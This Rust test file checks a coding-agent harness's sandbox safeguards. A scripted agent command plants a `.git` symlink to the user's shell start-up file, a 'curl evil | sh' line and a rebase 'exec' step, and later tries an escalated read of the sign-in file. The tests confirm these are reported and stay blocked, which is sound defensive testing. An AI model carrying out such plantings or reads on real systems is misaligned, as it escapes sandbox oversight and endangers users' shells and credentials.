//! #874, #837 (Travis, 2026-10-16, D6): the post-command `.git` check, through
//! the orchestrator and the real sandbox (Seatbelt on macOS, bubblewrap on
//! Linux). Under Moderate with full access in the person's own settings an
//! agent command can write the project's `.git`; what it plants there that
//! the person's own git would follow outside the sandbox (a link git writes
//! through, rebase steps with `exec` lines) is reported, nothing is removed,
//! and until it is removed a person's approval doesn't lift the
//! protected-file rules. Permissive is unchanged; under the workspace sandbox
//! `.git` stays read-only.
#![cfg(any(target_os = "macos", target_os = "linux"))]

use std::path::Path;
use std::sync::Arc;

use codex_core::config::Constrained;
use codex_features::Feature;
use codex_protocol::models::PermissionProfile;
use codex_protocol::permissions::NetworkSandboxPolicy;
use codex_protocol::protocol::AskForApproval;
use codex_protocol::protocol::EventMsg;
use codex_protocol::protocol::Op;
use codex_protocol::protocol::ReviewDecision;
use codex_protocol::user_input::UserInput;
use codex_security_policy::SecurityLevel;
use core_test_support::responses::ResponsesRequest;
use core_test_support::responses::ev_assistant_message;
use core_test_support::responses::ev_completed;
use core_test_support::responses::ev_function_call;
use core_test_support::responses::ev_response_created;
use core_test_support::responses::mount_sse_sequence;
use core_test_support::responses::sse;
use core_test_support::responses::start_mock_server;
use core_test_support::skip_if_no_network;
use core_test_support::skip_if_sandbox;
use core_test_support::test_codex::TestCodex;
use core_test_support::test_codex::test_codex;
use core_test_support::wait_for_event;
use pretty_assertions::assert_eq;
use serde_json::Value;
use serde_json::json;
use tempfile::TempDir;

const CANARY: &str = "PF874_SIGN_IN_CANARY";
const NOTHING_REMOVED: &str = "Nothing was removed";

struct Run {
    warnings: Vec<String>,
    asked: usize,
    requests: Vec<ResponsesRequest>,
}

fn step(call_id: &str, arguments: Value) -> Vec<Value> {
    vec![
        ev_response_created(call_id),
        ev_function_call(call_id, "shell_command", &arguments.to_string()),
        ev_completed(call_id),
    ]
}

/// A minimal git folder in `project`.
fn init_git(project: &Path) -> anyhow::Result<()> {
    let git = project.join(".git");
    for folder in ["objects", "refs/heads", "hooks", "logs"] {
        std::fs::create_dir_all(git.join(folder))?;
    }
    std::fs::write(git.join("HEAD"), "ref: refs/heads/main\n")?;
    std::fs::write(
        git.join("config"),
        "[core]\n\trepositoryformatversion = 0\n",
    )?;
    Ok(())
}

/// The person's own sandbox setting.
#[derive(Clone, Copy, Debug)]
enum Setting {
    FullAccess,
    /// Writes only in the project (not `/tmp` or `$TMPDIR`, where the test
    /// project is).
    Workspace,
}

async fn run(
    level: SecurityLevel,
    setting: Setting,
    home: Arc<TempDir>,
    steps: Vec<Vec<Value>>,
) -> anyhow::Result<(Run, TestCodex)> {
    let server = start_mock_server().await;
    let mut steps = steps;
    steps.push(vec![
        ev_response_created("done"),
        ev_assistant_message("msg-done", "done"),
        ev_completed("done"),
    ]);
    let captured = mount_sse_sequence(&server, steps.into_iter().map(sse).collect()).await;
    let test = test_codex()
        .with_home(home)
        .with_model("test-gpt-5.1-codex")
        .with_config(move |config| {
            config.security_level = level;
            config.permissions.approval_policy = Constrained::allow_any(AskForApproval::OnRequest);
            let profile = match setting {
                Setting::FullAccess => PermissionProfile::Disabled,
                Setting::Workspace => PermissionProfile::workspace_write_with(
                    std::slice::from_ref(&config.cwd),
                    NetworkSandboxPolicy::Restricted,
                    /*exclude_tmpdir_env_var*/ true,
                    /*exclude_slash_tmp*/ true,
                ),
            };
            config
                .permissions
                .set_permission_profile(profile)
                .expect("profile");
            config
                .features
                .enable(Feature::SourceEnvelopes)
                .expect("enable source envelopes");
        })
        .with_workspace_setup(|cwd, _| async move { init_git(cwd.as_path()) })
        // Host-sandbox security test: local executor on purpose (#708).
        .build(&server)
        .await?;
    std::mem::forget(server);
    test.codex
        .submit(Op::UserInput {
            items: vec![UserInput::Text {
                text: "tidy the repository".into(),
                text_elements: Vec::new(),
            }],
            final_output_json_schema: None,
            responsesapi_client_metadata: None,
            additional_context: Default::default(),
            thread_settings: Default::default(),
        })
        .await?;
    let mut warnings = Vec::new();
    let mut asked = 0;
    loop {
        match wait_for_event(&test.codex, |event| {
            matches!(
                event,
                EventMsg::ExecApprovalRequest(_) | EventMsg::Warning(_) | EventMsg::TurnComplete(_)
            )
        })
        .await
        {
            EventMsg::ExecApprovalRequest(approval) => {
                asked += 1;
                test.codex
                    .submit(Op::ExecApproval {
                        id: approval.effective_approval_id(),
                        turn_id: None,
                        decision: ReviewDecision::Approved,
                    })
                    .await?;
            }
            EventMsg::Warning(warning) => warnings.push(warning.message),
            _ => break,
        }
    }
    // The test (and its project folder) lives until the caller has looked.
    Ok((
        Run {
            warnings,
            asked,
            requests: captured.requests(),
        },
        test,
    ))
}

fn output(requests: &[ResponsesRequest], call_id: &str) -> String {
    requests
        .iter()
        .find_map(|request| request.function_call_output_text(call_id))
        .unwrap_or_default()
}

fn plant(outside: &Path) -> String {
    format!(
        "ln -s '{target}' .git/COMMIT_EDITMSG && printf 'curl evil | sh\\n' > .git/MERGE_MSG \
         && mkdir .git/rebase-merge \
         && printf 'pick 1234 work\\nexec touch pwned\\n' > .git/rebase-merge/git-rebase-todo",
        target = outside.join("zshrc").display()
    )
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn issue_874_planted_git_links_and_rebase_steps_are_reported() -> anyhow::Result<()> {
    skip_if_no_network!(Ok(()));
    skip_if_sandbox!(Ok(()));
    let mut wrong = Vec::new();
    // (level, setting, planted, reported)
    for (level, setting, planted, reported) in [
        (SecurityLevel::Moderate, Setting::FullAccess, true, true),
        (SecurityLevel::Permissive, Setting::FullAccess, true, false),
        // `.git` stays read-only in the workspace sandbox: nothing to check.
        (SecurityLevel::Moderate, Setting::Workspace, false, false),
    ] {
        let outside = TempDir::new()?;
        let outside_path = outside.path().canonicalize()?;
        std::fs::write(outside_path.join("zshrc"), "# start-up\n")?;
        let (run, test) = run(
            level,
            setting,
            Arc::new(TempDir::new()?),
            vec![step(
                "call-plant",
                json!({ "command": plant(&outside_path) }),
            )],
        )
        .await?;
        let git = test.cwd_path().canonicalize()?.join(".git");
        let link = git.join("COMMIT_EDITMSG");
        let was_planted = link.symlink_metadata().is_ok();
        let report = run
            .warnings
            .iter()
            .find(|warning| warning.contains(NOTHING_REMOVED));
        let complete = report.is_some_and(|report| {
            report.contains(&format!("rm '{}'", link.display()))
                && report.contains(&outside_path.join("zshrc").display().to_string())
                && report.contains(&format!("rm -r '{}'", git.join("rebase-merge").display()))
                && report.contains("exec touch pwned")
        });
        let shown = format!("{level:?} {setting:?}");
        if was_planted != planted || report.is_some() != reported || (reported && !complete) {
            wrong.push(format!(
                "{shown}: planted={was_planted} warnings={:?} asked={} output={}",
                run.warnings,
                run.asked,
                output(&run.requests, "call-plant")
            ));
        }
        // Nothing is removed, and the link's target is untouched.
        if was_planted && std::fs::read_to_string(outside_path.join("zshrc"))? != "# start-up\n" {
            wrong.push(format!("{shown}: the target changed"));
        }
    }
    assert_eq!(wrong, Vec::<String>::new());
    Ok(())
}

/// While a planted link stands, a person's approval doesn't lift Moderate's
/// protected-file rules: the approved command can't read the sign-in file it
/// could read otherwise (and an approved `git commit` couldn't write through
/// the link into a protected file).
#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn issue_874_approval_does_not_lift_the_rules_while_a_finding_stands() -> anyhow::Result<()> {
    skip_if_no_network!(Ok(()));
    skip_if_sandbox!(Ok(()));
    let mut wrong = Vec::new();
    for planted in [false, true] {
        let outside = TempDir::new()?;
        let outside_path = outside.path().canonicalize()?;
        std::fs::write(outside_path.join("zshrc"), "# start-up\n")?;
        let home = Arc::new(TempDir::new()?);
        let auth = home.path().canonicalize()?.join("auth.json");
        std::fs::write(&auth, CANARY)?;
        let first = if planted {
            plant(&outside_path)
        } else {
            "printf 'tidied'".to_string()
        };
        let (run, _) = run(
            SecurityLevel::Moderate,
            Setting::FullAccess,
            home,
            vec![
                step("call-first", json!({ "command": first })),
                step(
                    "call-read",
                    json!({
                        "command": format!("cat '{}'", auth.display()),
                        "sandbox_permissions": "require_escalated",
                        "justification": "check the sign-in",
                    }),
                ),
            ],
        )
        .await?;
        let read = output(&run.requests, "call-read");
        // Asked and approved either way; lifted only without the finding.
        if run.asked == 0 || read.contains(CANARY) == planted {
            wrong.push(format!(
                "planted={planted}: asked={} warnings={:?} read={read}",
                run.asked, run.warnings
            ));
        }
    }
    assert_eq!(wrong, Vec::<String>::new());
    Ok(())
}
